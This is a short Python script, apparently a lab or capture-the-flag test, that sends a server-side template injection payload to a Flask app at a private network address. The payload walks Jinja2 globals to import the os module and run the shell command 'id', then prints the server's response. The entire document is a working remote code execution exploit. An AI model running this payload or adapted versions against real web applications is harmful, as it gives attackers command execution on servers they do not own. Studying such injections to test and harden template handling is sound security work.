from pip._vendor import requests

r = requests.get('http://192.168.0.114:5000/app?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}')


print(r.text)